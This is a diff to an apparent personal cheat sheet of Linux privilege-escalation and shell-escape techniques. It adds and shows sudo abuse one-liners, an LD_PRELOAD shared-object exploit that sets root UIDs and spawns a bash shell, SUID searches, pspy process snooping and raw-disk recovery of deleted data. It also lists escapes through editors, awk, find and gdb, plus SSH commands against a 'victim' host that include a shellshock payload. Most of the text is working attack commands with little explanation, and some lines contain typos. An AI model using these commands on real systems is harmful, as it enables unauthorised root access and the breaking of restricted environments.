@@ -74,7 +74,7 @@ sudo su
 sudo -s
 sudo /bin/bash
 sudo passwd
-
+sudo wget -i file
 sudo -l
 sudo apache2 -f file 
 }
@@ -88,6 +88,7 @@ void _init() {
 unsetenv("LD_PRELOAD");
 setresuid(0,0,0);
 system("/bin/bash -p");
+
 }
 ]
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
@@ -145,6 +146,13 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
 2> /dev/null
 
 }
+M.  PSPY
+{
+	snoop process without root
+
+	./pspy
+	find task getting executed in every time or interval
+}
 Other Command
 {
 1. sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
@@ -155,6 +163,53 @@ Other Command
 6. sudo nano -S /bin/bash
 7. sudo ftp > !/bin/sh
 8. sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
+9. sudo su
+10. delted recover content grep --binary-files=text --context=100 ‘root’ /dev/sdb || strings /dev/sdb
+11 cd /opt chek content 
 }
 
+4. Escapting SHell
 
+{
+	
+A. 	If “/“ is allowed, /bin/bash
+B. export PATH=/usr/local/bin:/usr/bin:/bin:$PATH
+C. Editors
+
+   1. ed =>!'/bin/sh'
+   2. nano =>  CtrlR ctrlX  reset; sh 1>&0 2>&0
+   3.  vi, vim => :set shell=/bin/bash
+				  :shell
+				  # or
+				  :!/bin/bash
+4. Command TOOl
+   # cp =cp /bin/sh /current/PATH
+
+   # ftp  ftp>!/bin/sh
+   
+   # gdb !/bin/sh
+
+   # awk  awk 'BEGIN {system("/bin/bash")}'
+
+   # find find / -name bleh -exec /bin/bash \;
+
+   # expect expect spawn sh
+ 
+ 5. SSH
+ # exec commands before remote shell are loaded
+   ssh test@victim -t "/bin/sh"
+
+  # start ssh without loading any profile
+  ssh test@victim -t "bash --noprofile"
+
+# try shellshock
+  ssh test@victim -t "() { :; }; /bin/bash"
+
+6. # python
+python -c 'import os;os.system("/bin/bash")'
+
+# perl
+perl -e 'exec "/bin/sh";'
+
+# ruby
+ruby -e 'exec /bin/sh
